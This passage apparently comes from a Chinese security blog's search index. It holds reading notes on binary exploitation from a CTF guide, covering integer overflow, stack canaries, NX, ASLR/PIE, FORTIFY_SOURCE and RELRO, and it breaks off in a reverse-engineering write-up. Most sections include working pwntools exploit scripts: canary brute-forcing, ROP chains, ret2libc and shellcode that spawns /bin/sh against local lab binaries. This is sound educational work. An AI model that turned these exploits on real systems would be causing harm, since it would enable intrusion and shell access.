str(len(payload)))print(payload)io.sendline(payload)io.recv()io.sendline(b&quot;/bin/sh&quot;)io.interactive()","categories":[{"name":"pwn学习","slug":"pwn学习","permalink":"https://zzzzsky.github.io/categories/pwn%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://zzzzsky.github.io/tags/pwn/"},{"name":"读书笔记","slug":"读书笔记","permalink":"https://zzzzsky.github.io/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"},{"name":"《CTF竞赛权威指南-pwn篇》","slug":"《CTF竞赛权威指南-pwn篇》","permalink":"https://zzzzsky.github.io/tags/%E3%80%8ACTF%E7%AB%9E%E8%B5%9B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-pwn%E7%AF%87%E3%80%8B/"}]},{"title":"第8章_整数安全","slug":"第8章_整数安全","date":"2022-03-24T13:27:00.000Z","updated":"2022-03-24T13:33:44.046Z","comments":true,"path":"2022/03/24/第8章_整数安全/","link":"","permalink":"https://zzzzsky.github.io/2022/03/24/%E7%AC%AC8%E7%AB%A0_%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8/","excerpt":"","text":"如果一个整数用来计算一些敏感数值，如缓冲区大小或数值索引等，就会存在潜在的危险，通常情况下，整数溢出并没有改写额外的内存，不会导致任意代码执行，但是它会导致栈溢出和堆溢出，而后两者会导致任意代码执行。 整数溢出异常情况主要是3种 溢出，只有有符号数才会发生溢出，溢出标志OF可检测有符号数的溢出 1234int i; i = INT_MAX; //2147483647i++;printf(&quot;i=%d\\n&quot;, i); // -2147483648 回绕，无符号数会发生回绕，溢出标志CF可检测无符号数的溢出 1234unsigned int ui;ui = UINT_MAX; //在x86-32上，为4294967295ui++;printf(&quot;ui=%d\\n&quot;, ui); //ui=0 截断，将较大宽度的数存入一个宽度小的操作数中，高位发生截断 1234567891011121314#include &lt;stdio.h&gt;int main()&#123; unsigned int a = 0xffffffff; unsigned int b = 1; unsigned int c = a + b; printf(&quot;%#x\\n&quot;, &amp;c); printf(&quot;%d&quot;, c); return 0;&#125;//0xffffd000//0 漏洞多发函数整数溢出要配合其他类型的缺陷才能够有用，下面的两个函数都有一个size_t类型的参数，尝尝被误用而造成整数溢出，接着就可能导致缓冲区溢出漏洞 123#include &lt;string.h&gt;void * memcpy(void * dest, const void * src, size_t n);char * strncpy(char * dest, const char * src, size_t n); 假设输入的n足够大，可能发生回绕，或者当n输入为负数的时候，这个地方可能把它解析为非常大的正数，导致溢出 整数溢出示例123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;string.h&gt;void check(char * passwd)&#123; char passwd_buf[11]; unsigned char passwd_len = strlen(passwd); if(passwd_len &gt;= 4 &amp;&amp; passwd_len &lt;= 8) &#123; printf(&quot;good!\\n&quot;); strcpy(passwd_buf, passwd); &#125;else&#123; printf(&quot;bad!\\n&quot;); &#125;&#125;int main(int argc, char * argv[])&#123; check(argv[1]); return 0;&#125; 将所有保护都关掉进行测试 1234567891011121314151617from pwn import *image_addr = 0x8048000libc_addr = 0xf7ddc000jmp_esp_addr = 0x00002b59 + libc_addr # jmp esp的地址shellcode = shellcraft.i386.linux.sh() payload = b&#x27;A&#x27; * 24 + p32(jmp_esp_addr) + asm(shellcode) # gdb调试用pattern测得eip偏移是24个字节print(len(payload))payload = payload.ljust(261, b&#x27;\\x01&#x27;) # 不能是\\x00，会被strlen截断print(len(payload))p = process(argv=[&#x27;./main&#x27;, payload])p.interactive()","categories":[{"name":"pwn学习","slug":"pwn学习","permalink":"https://zzzzsky.github.io/categories/pwn%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://zzzzsky.github.io/tags/pwn/"},{"name":"读书笔记","slug":"读书笔记","permalink":"https://zzzzsky.github.io/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"},{"name":"《CTF竞赛权威指南-pwn篇》","slug":"《CTF竞赛权威指南-pwn篇》","permalink":"https://zzzzsky.github.io/tags/%E3%80%8ACTF%E7%AB%9E%E8%B5%9B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-pwn%E7%AF%87%E3%80%8B/"}]},{"title":"第4章_Linux安全机制","slug":"第4章_Linux安全机制","date":"2022-03-22T12:22:00.000Z","updated":"2022-03-22T12:24:41.867Z","comments":true,"path":"2022/03/22/第4章_Linux安全机制/","link":"","permalink":"https://zzzzsky.github.io/2022/03/22/%E7%AC%AC4%E7%AB%A0_Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/","excerpt":"","text":"Stack Canaries简介Stack Canaries 是一种对抗栈溢出攻击的技术，即SSP安全机制，有时也叫Stack cookies， 他是一个随机数，保存在栈上，比函数返回地址更低的位置，因为要想覆盖到返回地址，必然先覆盖到Canary，所以在函数返回前检查Canary是否变化，就可以达到保护栈的目的。 写程序测试 1234567#include &lt;stdio.h&gt;int main()&#123; char buf[10]; scanf(&quot;%s&quot;, buf); return 0;&#125; 1gcc -fstack-protector main.c -o main 运行，输入过长的字符，发现程序抛出异常stack smashing detected，表示检测到了栈溢出 12345╭─ ~/Desktop/testC ✔ ╰─ ./main 1111111111111111111111111111*** stack smashing detected ***: &lt;unknown&gt; terminated[1] 29048 abort (core dumped) ./main 反汇编看一下 123456789101112131415161718192021gef➤ disassemble mainDump of assembler code for function main: 0x00000000000006da &lt;+0&gt;: push rbp 0x00000000000006db &lt;+1&gt;: mov rbp,rsp 0x00000000000006de &lt;+4&gt;: sub rsp,0x20 0x00000000000006e2 &lt;+8&gt;: mov rax,QWORD PTR fs:0x28 ################ 0x00000000000006eb &lt;+17&gt;: mov QWORD PTR [rbp-0x8],rax ################ 0x00000000000006ef &lt;+21&gt;: xor eax,eax 0x00000000000006f1 &lt;+23&gt;: lea rax,[rbp-0x12] 0x00000000000006f5 &lt;+27&gt;: mov rsi,rax 0x00000000000006f8 &lt;+30&gt;: lea rdi,[rip+0xb5] # 0x7b4 0x00000000000006ff &lt;+37&gt;: mov eax,0x0 0x0000000000000704 &lt;+42&gt;: call 0x5b0 &lt;__isoc99_scanf@plt&gt; 0x0000000000000709 &lt;+47&gt;: mov eax,0x0 0x000000000000070e &lt;+52&gt;: mov rdx,QWORD PTR [rbp-0x8] ################ 0x0000000000000712 &lt;+56&gt;: xor rdx,QWORD PTR fs:0x28 ################ 0x000000000000071b &lt;+65&gt;: je 0x722 &lt;main+72&gt; ################ 0x000000000000071d &lt;+67&gt;: call 0x5a0 &lt;__stack_chk_fail@plt&gt; ################ 0x0000000000000722 &lt;+72&gt;: leave 0x0000000000000723 &lt;+73&gt;: ret End of assembler dump. 在Linux中，fs寄存器用来存TLS，而如果是64位程序，TLS字段偏移0x28的位置存放着stack_guard,程序先把他放到栈中，等函数运行完，在拿出fs:0x28和存放到栈中的那个stack_guard对比，如果不一样就会stack_chk_fail 攻击canaries主要有2中套路 将Canaries的值泄露出来 同时修改TLS和栈上的Canaries 泄露Canaries这里以NJCTF2017_messager题目为例 IDA打开分析，发现在函数400BE9中recv存在栈溢出漏洞，而400BC6的位置是将flag发送到客户端，所以我们的目的就是将返回地址覆盖为0x400BC6即可 重启服务器，canary就会变化，但是 这里采用的是，每连接一个客户端，就fork一个子程序，而子程序和服务器的canary是一样的，如果服务器不重启，fork的子程序的canary就不会变，所以可以采用爆破的方式 写EXP 123456789101112131415161718192021222324252627282930from pwn import *from Crypto.Util.number import *canary = b&#x27;\\x00&#x27;def leak_canary(): global canary while len(canary) &lt; 8: for x in range(256): io = remote(&quot;127.0.0.1&quot;, 5555) io.recv() # Welcome! payload = b&#x27;A&#x27;*104 + canary + long_to_bytes(x) # print(payload) io.send(payload) try: io.recv() canary = canary + long_to_bytes(x) break except: continue finally: io.close() print(f&quot;canary is &#123;canary&#125;&quot;)def pwn(): io = remote(&quot;127.0.0.1&quot;, 5555) io.recv() # Welcome! payload = b&#x27;A&#x27;*104 + canary + b&#x27;A&#x27; *8 + p64(0x400BC6) io.send(payload) print(io.recv())leak_canary()pwn() 在本地建个flag, 运行messager做一下测试 12345678910[+] Opening connection to 127.0.0.1 on port 5555: Done[*] Closed connection to 127.0.0.1 port 5555[+] Opening connection to 127.0.0.1 on port 5555: Done[*] Closed connection to 127.0.0.1 port 5555[+] Opening connection to 127.0.0.1 on port 5555: Done[*] Closed connection to 127.0.0.1 port 5555canary is b&#x27;\\x00&#125;\\xd90(\\x8b\\xd6\\x00&#x27;[+] Opening connection to 127.0.0.1 on port 5555: Doneb&#x27;flag&#123;niubiniubi&#125;\\n\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00&#x27;[*] Closed connection to 127.0.0.1 port 5555 https://e3pem.github.io/2018/09/30/NJCTF2017/题目原件可以从这里下载 覆盖TLS的canary在pthread_create创建的线程中,glibc就是在栈的高地址对TLS进行初始化，所以溢出足够多的数据就可以篡改tls中的那个canary https://dere.press/2020/10/18/glibc-tls/#fei-zhu-xian-cheng-qing-xing 这篇博客tls讲的很清楚 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;errno.h&gt;#include &lt;stdio.h&gt;#include &lt;pthread.h&gt;#include &lt;asm/prctl.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void pwn_payload() &#123; char *argv[2] = &#123;&quot;/bin/sh&quot;, 0&#125;; execve(argv[0], argv, 0);&#125;int fixup = 0;void * first(void *x)&#123; unsigned long *addr; arch_prctl(ARCH_GET_FS, &amp;addr); printf(&quot;thread FS %p\\n&quot;, addr); printf(&quot;cookie thread: 0x%lx\\n&quot;, addr[5]); unsigned long * frame = __builtin_frame_address(0); printf(&quot;stack_cookie addr %p \\n&quot;, &amp;frame[-1]); printf(&quot;diff : %lx\\n&quot;, (char*)addr - (char*)&amp;frame[-1]); unsigned long len =(unsigned long)( (char*)addr - (char*)&amp;frame[-1]) + fixup; // example of exploitation // prepare exploit void *exploit = malloc(len); memset(exploit, 0x41, len); void *ptr = &amp;pwn_payload; memcpy((char*)exploit + 16, &amp;ptr, 8); // exact stack-buffer overflow example memcpy(&amp;frame[-1], exploit, len); return 0;&#125;int main(int argc, char **argv, char **envp)&#123; pthread_t one; unsigned long *addr; void *val; arch_prctl(ARCH_GET_FS, &amp;addr); if (argc &gt; 1) fixup = 0x30; printf(&quot;main FS %p\\n&quot;, addr); printf(&quot;cookie main: 0x%lx\\n&quot;, addr[5]); pthread_create(&amp;one, NULL, &amp;first, 0); pthread_join(one,&amp;val); return 0;&#125; 这是书上的一个例子，编译这个例子就可以看到偏移 IDA打开分析程序，可以发现存在栈溢出漏洞 checksec发现没有开PIE，但是开了NX，所以无法在栈中写代码了 思路就是利用ROP，执行puts，泄露出libc的地址，然后利用read，将one_gadget的地址写入进去，最后利用leave_ret调到one_gadget的地址去，getshell，在覆盖的时候要覆盖掉足够多的数据，将TLS的canary覆盖为和栈中的canary一样即可 1234567891011121314151617181920212223242526272829303132333435363738394041from pwn import *from Crypto.Util.number import *pop_rdi = 0x0400b73pop_rsi_r15 = 0x0400b71leave_ret = 0x004008a6bss_addr = 0x0602010context.log_level = &quot;debug&quot;bs = ELF(&quot;./bs&quot;)libc = ELF(&quot;./libc-2.27.so&quot;)io = process(&#x27;./bs&#x27;)payload = b&quot;\\x00&quot; * 0x1008payload += b&#x27;\\x00&#x27; * 8 # canarypayload += p64(bss_addr - 8) # Because pop rbp; ret; bss_addr is rbppayload += p64(pop_rdi) + p64(bs.got[&#x27;puts&#x27;]) # rdi = bs.got[&#x27;puts&#x27;]payload += p64(bs.plt[&#x27;puts&#x27;]) # puts(bs.got[&#x27;puts&#x27;]) # print puts addrpayload += p64(pop_rdi) + p64(0) # rdi = 0payload += p64(pop_rsi_r15) + p64(bss_addr) + p64(0) # rsi = bss_addr, r15 = 0payload += p64(bs.plt[&#x27;read&#x27;]) # read(0, bss_addr, ?)payload += p64(leave_ret)payload = payload.ljust(0x2000, b&#x27;\\x00&#x27;)io.sendlineafter(&quot;send?\\n&quot;, str(0x2000))io.send(payload)io.recvuntil(&quot;goodbye.\\n&quot;)addr_puts = io.recv(6).ljust(8, b&#x27;\\x00&#x27;)print(&quot;addr_puts: %#X&quot; % u64(addr_puts))libc_baseaddr = u64(addr_puts) - libc.symbols[&#x27;puts&#x27;]print(&quot;libc_baseaddr: %#X&quot; % libc_baseaddr)one_gadget_addr = libc_baseaddr + 0x4f302io.send(p64(one_gadget_addr))io.interactive() No-eXecuteNo-eXecute表示不可执行，其原理就是将数据所在的内存页，比如堆栈，标识为不可执行，如果程序产生溢出转入执行shellcode的时候，CPU就会抛出异常 1234567891011121314#include &lt;unistd.h&gt;void vuln_func()&#123; char buf[128]; read(STDIN_FILENO, buf, 256);&#125;int main()&#123; vuln_func(); write(STDOUT_FILENO, &quot;Hello world!\\n&quot;, 13); return 0;&#125; 未开启NX情况根据书上的代码试验下，为了防止其他因素干扰，先关闭canary和ASLR, 然后创建一个没有开启NX的程序 用shellcode攻击下看看，payload 填充 +ret(jmp esp的地址) + shellcode 的形式 1234567891011121314151617 ROPgadget --binary libc-2.27.so| grep &quot;jmp esp&quot; # 0x00189435 : adc bh, ch ; jmp esp .....# 运行gdb gef➤ x/10i 0xf7ddc000+0x189437 0xf7f65437: jmp esp 0xf7f65439: add DWORD PTR [ecx],0x0 0xf7f6543c: mov al,0x18 0xf7f6543e: out dx,eax 0xf7f6543f: (bad) 0xf7f65440: cld 0xf7f65441: test BYTE PTR [ecx],al 0xf7f65443: add BYTE PTR [eax-0x4b0010d8],dh 0xf7f65449: test DWORD PTR [ecx],eax 0xf7f6544b: add BYTE PTR [eax+0x29],ahgef➤ quit 123456789101112from pwn import *context.log_level=&quot;debug&quot;ret = 0xf7f65437 # jmp espshellcode = b&quot;\\x31\\xc9\\xf7\\xe1\\xb0\\x0b\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80&quot;payload = 140 * b&#x27;\\x00&#x27; + p32(ret) + shellcodeprint(payload)io = process(&quot;a.out&quot;)io.send(payload)io.interactive() 开启NX情况1gcc -m32 -fno-stack-protector -no-pie -z noexecstack main.c 开启NX后，之前的EXP就不好使了，此时我们自己注入的，放在栈上的shellcode就不可以执行了，但是我们可以用程序已有的代码 123456gef➤ p system$1 = &#123;&lt;text variable, no debug info&gt;&#125; 0xf7e193d0 &lt;system&gt;gef➤ search-pattern &quot;/bin/sh&quot;[+] Searching &#x27;/bin/sh&#x27; in memory[+] In &#x27;/lib/i386-linux-gnu/libc-2.27.so&#x27;(0xf7ddc000-0xf7fb1000), permission=r-x 0xf7f5a1db - 0xf7f5a1e2 → &quot;/bin/sh&quot; 因为前面都关了ASLR，所以地址每次加载都不会变，直接执行system(“bin/sh”)即可 ASLR和PIE123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;dlfcn.h&gt;int main()&#123; int stack; int * heap = malloc(sizeof(int)); void * handle = dlopen(&quot;libc.so.6&quot;, RTLD_NOW | RTLD_GLOBAL); printf(&quot;executable: %p\\n&quot;, &amp;main); printf(&quot;system@plt: %p\\n&quot;, &amp;system); printf(&quot;heap: %p\\n&quot;, heap); printf(&quot;stack: %p\\n&quot;, &amp;stack); printf(&quot;libc: %p\\n&quot;, handle); free(heap); return 0;&#125; 关闭ASLR12echo 0 &gt; /proc/sys/kernel/randomize_va_spacegcc aslr.c -no-pie -fno-pie -ldl 可以发现，在关闭ASLR的时候，可以发现，除了stack有轻微的差距外，其他没有任何区别，每次执行都一样 部分开启ASLR1echo 1 &gt; /proc/sys/kernel/randomize_va_space 可以发现stack和libc的地址有显著变化，其他的不会变 完全开启ASLR1echo 2 &gt; /proc/sys/kernel/randomize_va_space 可以发现stack和libc的地址和heap有显著变化，其他的不会变 PIEASLR是一种操作系统层面的技术，二进制程序本身是不支持随机化加载的，人们在2003年引入了位置无关可执行文件（Position-Independent Executable, PIE）.，他是在应用层的编译器上实现的，通过将程序编译为位置无关代码（Position-Independent Code, PIC）,使程序可以被加载到任意位置，就像是一个特殊的共享库，但PIR也会在一定程度上影响性能，因此在大多数操作系统上PIE仅用于一些对安全性要求比较高的程序。 1gcc -pie -fpie aslr.c -ldl 可以发现所有地址全部随机（指起始位置，该对象内部依然是原来的结构，相对偏移是不会变的） 示例代码仍然为NX的那个例子 开启NX, ASLR, 关闭PIEexp为 123456789101112131415161718192021222324252627282930313233from pwn import *io = process(&quot;./nopie.out&quot;)nopie = ELF(&quot;./nopie.out&quot;)libc = ELF(&quot;./libc-2.27.so&quot;)vlun_func = 0x08048456payload1 = b&quot;A&quot; * 140 + p32(nopie.plt[&#x27;write&#x27;]) + p32(vlun_func) + p32(1) + p32(nopie.got[&#x27;write&#x27;])io.send(payload1)libc_addr = u32(io.recv(4)) - libc.symbols[&#x27;write&#x27;]print(hex(libc_addr))# system_addr = libc.symbols[&#x27;system&#x27;] + libc_addr# binsh_addr = 0x17E1DB + libc_addr# payload2 = b&quot;A&quot; * 140 + p32(system_addr)+p32(0) + p32(binsh_addr)# io.send(payload2)# io.interactive()pop_ebx = 0x080482e9one_gadget = 0x137eef + libc_addrlibc_got_addr = 0x01D8000 + libc_addrpayload2 = b&#x27;A&#x27; * 140 + p32(pop_ebx) + p32(libc_got_addr)payload2 += p32(one_gadget) + p32(0)# gdb.attach(io)# pause()io.send(payload2)io.interactive() 开启NX, ASLR, PIE这里修改下源代码测试，使其泄露出main函数地址,以便知道文件加载基地址 123456789101112131415#include &lt;unistd.h&gt;void vuln_func()&#123; char buf[128]; read(STDIN_FILENO, buf, 256);&#125;int main()&#123; printf(&quot;executable: %p\\n&quot;, &amp;main); vuln_func(); write(STDOUT_FILENO, &quot;Hello world!\\n&quot;, 13); return 0;&#125; 1234567891011121314151617181920212223242526272829from pwn import *pie_fpie = ELF(&quot;./pie_fpie.out&quot;)libc = ELF(&quot;./libc-2.27.so&quot;)io = process(&#x27;./pie_fpie.out&#x27;)io.recvuntil(&quot;executable: &quot;)main_addr_hex = io.recvuntil(&quot;\\n&quot;)[:-1].decode()main_addr_hex = int(main_addr_hex, 16)pie_fpie_baseaddr = main_addr_hex - pie_fpie.symbols[&#x27;main&#x27;]vuln_addr_offset = 0x57Dgot_offset = 0x1FD0 + pie_fpie_baseaddrpayload1 = b&quot;A&quot; * 132 +p32(got_offset) +b&#x27;A&#x27;*4 + p32(pie_fpie.plt[&#x27;write&#x27;] + pie_fpie_baseaddr) + p32(vuln_addr_offset + pie_fpie_baseaddr)+ p32(1) + p32(pie_fpie.got[&#x27;write&#x27;] + pie_fpie_baseaddr)io.send(payload1)write_addr = u32(io.recv(4))libc_addr = write_addr - libc.symbols[&#x27;write&#x27;]print(hex(libc_addr))binshaddr = libc_addr + next(libc.search(b&#x27;/bin/sh&#x27;))system_addr = libc_addr + libc.symbols[&#x27;system&#x27;]payload2 = b&#x27;A&#x27; * 140 + p32(system_addr) + p32(0) + p32(binshaddr)io.send(payload2)io.interactive() FORTIFY SOURCE这是一种针对危险函数的检查机制，在编译时尝试去确定风险是否存在，或者将危险函数替换为相对安全的函数实现，以大大降低缓冲区溢出发生的风险 -D_FORTIFY_SOURCE=1时，开启缓冲区溢出攻击检查 -D_FORTIFY_SOURCE=2时，开启缓冲区溢出以及格式化字符串攻击检查 用以下代码测试 1234567891011121314151617181920212223242526#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;int main(int argc, char *argv[])&#123; char buf1[10], buf2[10], *s; int num; memcpy(buf1, argv[1], 10); //safe strcpy(buf2, &quot;AAAABBBBC&quot;); printf(&quot;%s %s\\n&quot;, buf1, buf2); memcpy(buf1, argv[2], atoi(argv[3])); //unknown strcpy(buf2, argv[1]); printf(&quot;%s %s\\n&quot;, buf1, buf2); memcpy(buf1, argv[1], 11); //unsafe strcpy(buf2, &quot;AAAABBBBCC&quot;); s = fgets(buf1, 11, stdin); //fmt unknown printf(buf1, &amp;num); return 0;&#125; 编译时的安全检查1gcc -g -fno-stack-protector -O1 -D_FORTIFY_SOURCE=2 main.c -o fortify_chk 运行时的安全检查将unsafe的部分注释掉，重新编译 D_FORTIFY_SOURCE=01gcc -g -fno-stack-protector -O1 -D_FORTIFY_SOURCE=0 main.c -o fortify0 这个地方输入的argv[1] 可以导致buf2溢出，但是程序仍然可以正常运行 D_FORTIFY_SOURCE=11gcc -g -fno-stack-protector -O1 -D_FORTIFY_SOURCE=1 main.c -o fortify1 unknown部分被检测了出来，但是fmt unknown（%n, %5%x等）没有检测出来 D_FORTIFY_SOURCE=2 格式化字符串漏洞这里也被检测出来了 RELRORELRO(Relocation Read-Only)机制的提出就是为了解决延迟绑定的安全问题，它将符号重定向表设置为只读，或者再程序启动时就解析并绑定所有动态符号，从而避免GOT上的地址被篡改。 测试代码 1234567891011#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(int argc, char * argv[])&#123; size_t * p = (size_t *)strtol(argv[1], NULL, 16); p[0] = 0x41414141; printf(&quot;RELRO: %x\\n&quot;, (unsigned int)*p); return 0;&#125; 将参数的地址改为.got 或 .got.plt等做测试 NO RELRO12345678gcc -z norelro -no-pie -fno-pie main.c -o relro_norelroreadelf -S relro_norelro ..... [21] .got PROGBITS 0000000000600910 00000910 0000000000000010 0000000000000008 WA 0 0 8 [22] .got.plt PROGBITS 0000000000600920 00000920 0000000000000028 0000000000000008 WA 0 0 8...... 测试程序，发现.got和.got.plt都是可写的 Partial RELRO12345678gcc -z lazy -no-pie -fno-pie main.c -o relro_lazyreadelf -S relro_lazy..... [21] .got PROGBITS 0000000000600ff0 00000ff0 0000000000000010 0000000000000008 WA 0 0 8 [22] .got.plt PROGBITS 0000000000601000 00001000 0000000000000028 0000000000000008 WA 0 0 8..... Full RELRO123456gcc -z now -no-pie -fno-pie main.c -o relro_now readelf -S relro_now..... [21] .got PROGBITS 0000000000600fc8 00000fc8 0000000000000038 0000000000000008 WA 0 0 8..... 在程序编译时开启Full RELRO ， .got.plt段就不需要了，在这种情况下，延迟绑定将被禁止。link_map和_dll_runtime_resolve的地址也不会被装入。开启Full RELRO会对程序启动时的性能造成一定的影响，但只有这样才能防止攻击者篡改GOT表","categories":[{"name":"pwn学习","slug":"pwn学习","permalink":"https://zzzzsky.github.io/categories/pwn%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://zzzzsky.github.io/tags/pwn/"},{"name":"读书笔记","slug":"读书笔记","permalink":"https://zzzzsky.github.io/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"},{"name":"《CTF竞赛权威指南-pwn篇》","slug":"《CTF竞赛权威指南-pwn篇》","permalink":"https://zzzzsky.github.io/tags/%E3%80%8ACTF%E7%AB%9E%E8%B5%9B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-pwn%E7%AF%87%E3%80%8B/"}]},{"title":"2022_虎符CTF_部分RE_WP","slug":"2022虎符CTF_部分RE_WP","date":"2022-03-21T05:41:00.000Z","updated":"2022-03-21T05:54:50.183Z","comments":true,"path":"2022/03/21/2022虎符CTF_部分RE_WP/","link":"","permalink":"https://zzzzsky.github.io/2022/03/21/2022%E8%99%8E%E7%AC%A6CTF_%E9%83%A8%E5%88%86RE_WP/","excerpt":"","text":"fpbe根据知乎这篇文章 https://zhuanlan.zhihu.com/p/467647354作者在编写程序中 有用到fpbe.bpf.c这个源文件，而在这个文件中用到了BPF_KPROBE(uprobe)，这个函数就是在那个fpbe程序中的uprobed_function之前执行，但是BPF_KPROBE(uprobe) 是ebpf字节码形式的，IDA看不到，所以先binwalk提取出用ebpf字节码的那部分来，然后用llvm-objdump -d xxx.o 提取,就可以看到验证的函数了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899F4018.elf: file format ELF64-BPFDisassembly of section uprobe/func:uprobe: 0: 79 12 68 00 00 00 00 00 r2 = *(u64 *)(r1 + 104) 1: 67 02 00 00 20 00 00 00 r2 &lt;&lt;= 32 2: 77 02 00 00 20 00 00 00 r2 &gt;&gt;= 32 3: 79 13 70 00 00 00 00 00 r3 = *(u64 *)(r1 + 112) 4: 67 03 00 00 20 00 00 00 r3 &lt;&lt;= 32 5: 77 03 00 00 20 00 00 00 r3 &gt;&gt;= 32 6: bf 34 00 00 00 00 00 00 r4 = r3 7: 27 04 00 00 c0 6d 00 00 r4 *= 28096 8: bf 25 00 00 00 00 00 00 r5 = r2 9: 27 05 00 00 88 fb 00 00 r5 *= 64392 10: 0f 45 00 00 00 00 00 00 r5 += r4 11: 79 14 60 00 00 00 00 00 r4 = *(u64 *)(r1 + 96) 12: 67 04 00 00 20 00 00 00 r4 &lt;&lt;= 32 13: 77 04 00 00 20 00 00 00 r4 &gt;&gt;= 32 14: bf 40 00 00 00 00 00 00 r0 = r4 15: 27 00 00 00 fb 71 00 00 r0 *= 29179 16: 0f 05 00 00 00 00 00 00 r5 += r0 17: 79 11 58 00 00 00 00 00 r1 = *(u64 *)(r1 + 88) 18: b7 00 00 00 00 00 00 00 r0 = 0 19: 73 0a f8 ff 00 00 00 00 *(u8 *)(r10 - 8) = r0 20: 7b 0a f0 ff 00 00 00 00 *(u64 *)(r10 - 16) = r0 21: 7b 0a e8 ff 00 00 00 00 *(u64 *)(r10 - 24) = r0 22: 67 01 00 00 20 00 00 00 r1 &lt;&lt;= 32 23: 77 01 00 00 20 00 00 00 r1 &gt;&gt;= 32 24: bf 10 00 00 00 00 00 00 r0 = r1 25: 27 00 00 00 8e cc 00 00 r0 *= 52366 26: 0f 05 00 00 00 00 00 00 r5 += r0 27: b7 06 00 00 01 00 00 00 r6 = 1 28: 18 00 00 00 95 59 73 a1 00 00 00 00 18 be 00 00 r0 = 209012997183893 ll 30: 5d 05 42 00 00 00 00 00 if r5 != r0 goto +66 &lt;LBB0_5&gt; 31: bf 35 00 00 00 00 00 00 r5 = r3 32: 27 05 00 00 bf f1 00 00 r5 *= 61887 33: bf 20 00 00 00 00 00 00 r0 = r2 34: 27 00 00 00 e5 6a 00 00 r0 *= 27365 35: 0f 50 00 00 00 00 00 00 r0 += r5 36: bf 45 00 00 00 00 00 00 r5 = r4 37: 27 05 00 00 d3 ad 00 00 r5 *= 44499 38: 0f 50 00 00 00 00 00 00 r0 += r5 39: bf 15 00 00 00 00 00 00 r5 = r1 40: 27 05 00 00 84 92 00 00 r5 *= 37508 41: 0f 50 00 00 00 00 00 00 r0 += r5 42: 18 05 00 00 40 03 54 e5 00 00 00 00 56 a5 00 00 r5 = 181792633258816 ll 44: 5d 50 34 00 00 00 00 00 if r0 != r5 goto +52 &lt;LBB0_5&gt; 45: bf 35 00 00 00 00 00 00 r5 = r3 46: 27 05 00 00 85 dd 00 00 r5 *= 56709 47: bf 20 00 00 00 00 00 00 r0 = r2 48: 27 00 00 00 28 80 00 00 r0 *= 32808 49: 0f 50 00 00 00 00 00 00 r0 += r5 50: bf 45 00 00 00 00 00 00 r5 = r4 51: 27 05 00 00 2d 65 00 00 r5 *= 25901 52: 0f 50 00 00 00 00 00 00 r0 += r5 53: bf 15 00 00 00 00 00 00 r5 = r1 54: 27 05 00 00 12 e7 00 00 r5 *= 59154 55: 0f 50 00 00 00 00 00 00 r0 += r5 56: 18 05 00 00 a3 4d 48 74 00 00 00 00 f3 a6 00 00 r5 = 183564558159267 ll 58: 5d 50 26 00 00 00 00 00 if r0 != r5 goto +38 &lt;LBB0_5&gt; 59: bf 35 00 00 00 00 00 00 r5 = r3 60: 27 05 00 00 2c 82 00 00 r5 *= 33324 61: bf 20 00 00 00 00 00 00 r0 = r2 62: 27 00 00 00 43 ca 00 00 r0 *= 51779 63: 0f 50 00 00 00 00 00 00 r0 += r5 64: bf 45 00 00 00 00 00 00 r5 = r4 65: 27 05 00 00 8e 7c 00 00 r5 *= 31886 66: 0f 50 00 00 00 00 00 00 r0 += r5 67: bf 15 00 00 00 00 00 00 r5 = r1 68: 27 05 00 00 3a f2 00 00 r5 *= 62010 69: 0f 50 00 00 00 00 00 00 r0 += r5 70: 18 05 00 00 77 72 5a 48 00 00 00 00 9c b9 00 00 r5 = 204080879923831 ll 72: 5d 50 18 00 00 00 00 00 if r0 != r5 goto +24 &lt;LBB0_5&gt; 73: 63 1a f4 ff 00 00 00 00 *(u32 *)(r10 - 12) = r1 74: 63 4a f0 ff 00 00 00 00 *(u32 *)(r10 - 16) = r4 75: 63 2a ec ff 00 00 00 00 *(u32 *)(r10 - 20) = r2 76: 63 3a e8 ff 00 00 00 00 *(u32 *)(r10 - 24) = r3 77: 18 01 00 00 43 54 46 7b 00 00 00 00 25 73 7d 0a r1 = 755886917287302211 ll 79: 7b 1a d8 ff 00 00 00 00 *(u64 *)(r10 - 40) = r1 80: 18 01 00 00 46 4c 41 47 00 00 00 00 3a 20 48 46 r1 = 5064333215653776454 ll 82: 7b 1a d0 ff 00 00 00 00 *(u64 *)(r10 - 48) = r1 83: 18 01 00 00 45 21 20 59 00 00 00 00 4f 55 52 20 r1 = 